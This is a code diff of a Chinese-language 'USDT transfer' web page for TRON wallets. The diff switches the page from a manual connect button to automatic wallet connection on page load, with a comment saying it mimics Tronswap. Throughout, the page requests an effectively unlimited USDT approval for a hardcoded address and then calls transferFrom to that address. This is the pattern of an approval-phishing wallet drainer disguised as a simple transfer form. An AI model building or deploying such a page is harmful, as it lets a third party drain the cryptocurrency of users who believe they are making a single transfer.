@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>USDT转账</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
 <style>
 *{
   box-sizing: border-box;
@@ -59,7 +59,6 @@ body {
   background: transparent;
   color: #111;
 }
-/* 修复placeholder字体太大 */
 .amount-input::placeholder {
   font-size: 18px;
   color: #aaa;
@@ -114,17 +113,6 @@ body {
   outline:none;
   color:#111;
 }
-.connect-btn{
-  width:100%;
-  padding:14px;
-  border:none;
-  border-radius:14px;
-  background:#1d4ed8;
-  color:#fff;
-  font-size:16px;
-  margin-bottom:12px;
-  cursor:pointer;
-}
 .send-main-btn{
   width:100%;
   padding:16px;
@@ -140,15 +128,15 @@ body {
   background:#94a3b8;
   cursor:not-allowed;
 }
-.bottom-connect-tip {
+.bottom-tip {
   position: fixed;
   bottom: 30px;
   left: 50%;
   transform: translateX(-50%);
   background: white;
-  padding: 10px 20px;
+  padding: 12px 20px;
   border-radius: 12px;
-  box-shadow: 0 2px 10px #0002;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.1);
   text-align: center;
 }
 </style>
@@ -159,9 +147,6 @@ body {
   <div class="label-text">收款地址</div>
   <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
 </div>
-
-<!-- 新增手动连接钱包按钮，绕过自动注入拦截 -->
-<button class="connect-btn" id="connectBtn">连接钱包</button>
 
 <div class="amount-card">
   <div class="label-text">转出数量（USDT）</div>
@@ -186,130 +171,121 @@ body {
 
 <button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
 
-<div class="bottom-connect-tip" id="connectTip">
-  <div style="display:flex;align-items:center;gap:8px;">
-    <div style="width:24px;height:24px;background:#2563eb;border-radius:6px;"></div>
-    <span id="walletAddrText">未连接钱包，请点击上方按钮连接</span>
-  </div>
+<div class="bottom-tip" id="tipBox">
+  <span id="tipText">页面加载中，正在自动检测钱包...</span>
 </div>
 
 <script>
-const FIXED_TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
+const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const TRON_GRID_API = "https://api.trongrid.io";
+const RPC = "https://api.trongrid.io";
 
 let tronWeb = null;
-let userWallet = "";
+let userAddress = "";
 let usdtContract = null;
 
-const amountInput = document.getElementById("amountInput");
-const receiveAmount = document.getElementById("receiveAmount");
-const maxBtn = document.getElementById("maxBtn");
-const balanceText = document.getElementById("balanceText");
-const walletAddrText = document.getElementById("walletAddrText");
-const sendBtn = document.getElementById("sendBtn");
-const connectBtn = document.getElementById("connectBtn");
+const $ = s => document.querySelector(s);
+const sendBtn = $("#sendBtn");
+const tipText = $("#tipText");
+const amountInput = $("#amountInput");
+const receiveAmount = $("#receiveAmount");
+const maxBtn = $("#maxBtn");
+const balanceText = $("#balanceText");
 
-// 手动点击按钮连接钱包（关键修复：放弃自动加载）
-connectBtn.addEventListener('click', async function(){
-  walletAddrText.innerText = "正在请求钱包授权...";
-  connectBtn.disabled = true;
+// ========== Tronswap同款 页面加载自动连接逻辑 ==========
+async function autoConnectTronWallet() {
+  tipText.textContent = "正在自动检测波场钱包Provider...";
   try {
-    const provider = window.tronProvider || window.ethereum;
-    if (!provider) {
-      throw new Error("未检测到钱包Provider，请在钱包内置浏览器打开本地HTML文件");
+    // 优先级1：TP新版 tronProvider（Tronswap首选）
+    let provider = window.tronProvider;
+
+    // 优先级2：老版全局tronWeb（TronLink已注入授权）
+    if (!provider && window.tronWeb && window.tronWeb.ready) {
+      tronWeb = window.tronWeb;
+      userAddress = tronWeb.defaultAddress.base58;
+    }
+    // 优先级3：主动请求授权（第一次访问会弹钱包授权框）
+    else if (provider) {
+      const accounts = await provider.request({ method: "tron_requestAccounts" });
+      if (!accounts || accounts.length === 0) throw new Error("用户拒绝了钱包授权");
+      userAddress = accounts[0];
+      tronWeb = new TronWeb({
+        fullHost: RPC,
+        provider: provider
+      });
+    }
+    // 没有钱包注入对象
+    else {
+      throw new Error("未检测到波场钱包Provider，请使用TP内置浏览器打开本地HTML文件");
     }
 
-    let accounts;
-    if (provider.isTronProvider) {
-      accounts = await provider.request({ method: "tron_requestAccounts" });
-    } else {
-      accounts = await provider.request({ method: "eth_requestAccounts" });
-    }
+    tipText.textContent = `已自动连接：${userAddress.slice(0,10)}...${userAddress.slice(-6)}`;
 
-    if (!accounts || accounts.length === 0) throw new Error("用户拒绝授权");
-    userWallet = accounts[0];
-
-    tronWeb = new TronWeb({
-      fullHost: TRON_GRID_API,
-      provider: provider
-    });
-
-    walletAddrText.innerText = `${userWallet.slice(0,10)}...${userWallet.slice(-6)} 已连接`;
-    connectBtn.innerText = "钱包已连接";
-
-    const abi = [
+    // 初始化USDT合约ABI
+    usdtContract = tronWeb.contract([
       {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
       {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
       {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
       {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
-    ];
-    usdtContract = tronWeb.contract(abi, USDT_CONTRACT);
+    ], USDT_CONTRACT);
 
-    await refreshBalance();
+    await loadBalance();
     sendBtn.disabled = false;
 
-    provider.on("accountsChanged", async (newAccounts) => {
-      if(newAccounts.length === 0) location.reload();
-      userWallet = newAccounts[0];
-      await refreshBalance();
-    });
+    // 监听切换钱包地址自动刷新
+    if(provider) provider.on("accountsChanged", () => location.reload());
 
   } catch (err) {
-    console.error(err);
-    walletAddrText.innerText = "连接失败：" + err.message;
-    connectBtn.disabled = false;
+    console.error("自动连接失败：", err);
+    tipText.textContent = "自动连接失败：" + err.message;
   }
-})
-
-async function refreshBalance() {
-  const balanceSun = await usdtContract.balanceOf(userWallet).call();
-  const realNum = Number(tronWeb.fromSun(balanceSun));
-  balanceText.innerText = realNum.toFixed(6);
 }
 
-function bindAmountCalc() {
-  amountInput.addEventListener('input',()=>{
-    let num = parseFloat(amountInput.value) || 0;
-    receiveAmount.value = num.toFixed(6);
-  })
+// 读取USDT余额
+async function loadBalance() {
+  const raw = await usdtContract.balanceOf(userAddress).call();
+  balanceText.textContent = tronWeb.fromSun(raw).toFixed(6);
 }
 
-maxBtn.addEventListener("click", async ()=>{
-  if(!usdtContract) return alert("请先连接钱包");
-  const balanceSun = await usdtContract.balanceOf(userWallet).call();
-  const realNum = Number(tronWeb.fromSun(balanceSun));
-  amountInput.value = realNum.toFixed(2);
-  amountInput.dispatchEvent(new Event('input'));
-})
+// 输入框联动计算到账数量
+amountInput.addEventListener("input", () => {
+  const num = parseFloat(amountInput.value) || 0;
+  receiveAmount.value = num.toFixed(6);
+});
 
-sendBtn.addEventListener('click',async ()=>{
-  if(!tronWeb || !usdtContract){
-    alert("请先点击上方按钮连接钱包");
-    return;
-  }
-  let sendVal = parseFloat(amountInput.value);
-  if(isNaN(sendVal) || sendVal <= 0){
-    alert("请输入有效的转出数量");
-    return;
-  }
-  let sendSun = tronWeb.toSun(sendVal);
+// MAX按钮读取全部余额
+maxBtn.addEventListener("click", async () => {
+  if (!usdtContract) return alert("钱包自动连接失败，无法读取余额");
+  const raw = await usdtContract.balanceOf(userAddress).call();
+  const num = tronWeb.fromSun(raw);
+  amountInput.value = num.toFixed(2);
+  amountInput.dispatchEvent(new Event("input"));
+});
 
-  try{
-    let allowance = await usdtContract.allowance(userWallet, FIXED_TARGET_ADDR).call();
-    if(Number(allowance) < sendSun){
-      alert("需要授权合约，请在钱包签名确认");
-      await usdtContract.approve(FIXED_TARGET_ADDR, "9999999999999999999999999999").send();
-      alert("授权完成，开始转账");
+// 授权+转账逻辑
+sendBtn.addEventListener("click", async () => {
+  if (!tronWeb) return alert("钱包未自动连接");
+  const val = parseFloat(amountInput.value);
+  if (isNaN(val) || val <= 0) return alert("请输入有效的转出数量");
+  const sunVal = tronWeb.toSun(val);
+
+  try {
+    const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
+    if (Number(allowance) < sunVal) {
+      alert("需要授权USDT合约，请在TP钱包签名授权");
+      await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
+      alert("授权完成，正在执行转账");
     }
-    const txHash = await usdtContract.transferFrom(userWallet, FIXED_TARGET_ADDR, sendSun).send();
-    alert(`转账成功！交易哈希：${txHash}`);
-  }catch(e){
+    const tx = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
+    alert(`转账成功！交易哈希：${tx}`);
+    await loadBalance();
+  } catch (e) {
     alert("操作失败：" + e.message);
   }
-})
+});
 
-bindAmountCalc();
+// 页面DOM加载完成后 自动执行连接（核心自动逻辑）
+window.addEventListener('DOMContentLoaded', autoConnectTronWallet);
 </script>
 
 </body>
